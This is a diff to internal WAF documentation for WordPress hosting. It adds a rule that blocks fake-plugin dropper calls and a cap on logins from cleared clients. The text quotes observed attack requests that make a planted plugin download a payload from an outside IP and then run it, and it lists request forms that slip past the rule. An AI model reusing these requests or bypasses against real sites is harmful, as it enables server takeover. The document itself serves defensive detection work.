@@ -542,8 +542,9 @@ The carve-out is therefore split: **437** (the JS `\x` hex-escape form
 after F16) stays fully suppressed on all `/wp-admin/`; **438** (base64) is kept **`logonly`**
 on the two pre-auth endpoints (detect-and-watch, zero enforcement — a
 `logonly` hit is dropped by the autoblock feed, which ingests only
-`action=block`, and no `WAF_BACKDOOR` rule is block-tier, so no ban even
-though the family is autoblock-armed) and stays suppressed
+`action=block`, and the family's only block-tier rule, 440, keys on a plugin
+PHP file's command call, never on a body like this, so no ban even though the
+family is autoblock-armed) and stays suppressed
 on the rest of `/wp-admin/` (authed editors). Watch the logonly stream
 (rule 438 on an admin-ajax URI) to separate real attacks from WPCode
 noise before considering any promotion.
@@ -1338,6 +1339,54 @@ Rules 430-436 default to `logonly`; **437 and 438 default to `challenge`** (see 
 
 ---
 
+## Rule 440 — `rule_plugin_dropper_cmd` (a fake plugin's command call)
+
+Reason family **`WAF_BACKDOOR`**, tag `PLUGIN_CMD:DOWNLOAD` / `PLUGIN_CMD:RUN`,
+**block** at the edge (the family's first block-tier rule). Its `waf_security`
+ban, and with it the alert, is **held in code** (`HoldAutoblock`, `RULE_440 = 0`)
+through a burn-in: `task=run` alone is the marker, and a page can make a
+visitor's browser send it (an `<img>` src), which would plant a 6 h node-wide ban
+on that visitor. A held block rule runs late in `cfm_waf.lua`, with the others,
+so it never shadows an armed rule's ban. `RULE_440 = 1` arms it. Since
+2026-11-04.
+
+**What it stops.** The last step of a WordPress takeover seen on vol2.gr
+(titan): an IP logs in with a stolen password, uploads a plugin with a random
+name through `update.php?action=upload-plugin`, then calls the plugin's own PHP
+file to fetch and start the payload:
+
+```
+GET /wp-content/plugins/wp-m9xxwfjz24/wp-m9xxwfjz24.php?task=download&url=http://151.245.195.51/bog
+GET /wp-content/plugins/wp-m9xxwfjz24/wp-m9xxwfjz24.php?task=run
+```
+
+The same operator made the same two calls in October with another plugin name
+(`wp-uxtczi5yl0`). Both uploads were refused upstream (Imunify), so the calls got
+404; on a site where the upload lands, this is the request that runs it.
+
+**How.** A request to a `.php` file (or a PATH_INFO after one) under
+`/wp-content/plugins/` or `/wp-content/mu-plugins/`, at any depth and under any
+install directory, whose `task` field is `download` with a `url` field holding a
+URL (`DOWNLOAD`), or `run` (`RUN`). Fields are read as PHP registers them
+(`php_request_fields`: the query, and a form body on a POST), every value tested,
+case and surrounding blanks ignored.
+
+**FP read.** The October and November domlogs of seven nodes (titan, orion,
+mars, earth, virgo, rigel, speedhost): no request to a PHP file under those
+directories carried a `task` field outside these attacks. Joomla's `task=` on
+`/index.php` and `/administrator/` is not on that path.
+
+**Not covered.** A theme's PHP file, another content directory (Bedrock's
+`/app/plugins/`, a renamed `wp-content`), a directory index
+(`/wp-content/plugins/x/?task=run` reaching an `index.php`), another field name, a
+`url` without a scheme (`151.245.195.51/bog`, `//host/x`) or no `url` at all (the
+URL inside the dropper), a command in a header or a cookie, and a form body padded
+past `waf_body_max_len` (32 KB), which the edge does not read whole, or one it
+reads only in the body burn-in (chunked, no Content-Length, or over the read limit),
+where 440 is not enforced (`BURNIN_ENFORCE_IDS`) and its hit is logged: only the
+query is certain. The upload itself is not refused here: a logged-in upload is the
+administrator's own action, as far as the edge can tell.
+
 ## Rule 331 — `rule_shell_write_exec` (a webshell terminal writing a dropper)
 
 Reason family **`WAF_RCE`**, logonly, reasons `WAF_RCE:SHELL_FETCH_TO_EXEC`,
@@ -1482,6 +1531,28 @@ The panel ports (cPanel / WHM / webmail) read no body and say so (`body_unread`)
 never runs there;
 cPanel's own `login_log` detector (`internal/detectors/cpanel`) bans repeated failures,
 which the edge cannot tell from successes.
+
+**A client holding a valid clearance** (since 2026-11-04). The post-clearance
+conversion (`post_clearance_action`) turns a challenge-tier hit into `logonly` for a
+cleared client, so it is never challenged again; for 501 that meant a client that solved
+the challenge once could post logins without limit from its IP. cfm.lua now refuses the
+cleared client's submissions that cross the threshold (403, `X-CFM-Action:
+login_capped_pc`) until the window closes (`auth_window_sec`), and pushes the hit as
+`logonly` as before, so it never earns a `waf_security` ban; a `login_capped_pc` line in
+the edge error log records the refusal (cfm.waf.log and the history read logonly). 501 counts wherever it
+sits in the hit list: an equal-tier rule that runs earlier (302 on a `<script` arg)
+takes the headline, and keying on the headline let a cleared client switch the cap off
+with one junk argument. A resumed POST (the stashed login a client was challenged for,
+replayed after the solve) is let through once per IP per window, the counter's own grain
+(501 counts per IP across vhosts): a client can
+mint resume tokens by posting without its cookie. In the three weeks before
+(2026-10-14 → 11-04, seven nodes, `cfm.waf.log`) 501 fired ~15 800 times, all at
+`challenge_v2` but 7 converted ones, and those 7 were Greek ISPs, a `cpanel.` login and an
+office tool: a ban would have hit them, a 20-second refusal does not hurt them. A cleared
+client posting at the cap still gets ~21 tries a minute (plus one resumed login per
+window, about 3 a minute, if it mints resume tokens); banning that is the job of a
+failed-login count in the web detector, which can see the origin's answer (planned, see
+`docs/ROADMAP.md`).
 
 Not counted (the path test reads `ngx.var.uri`, no query string): Drupal 7
 `/index.php?q=user/login`, Joomla `POST /administrator/` (the directory index), Joomla's
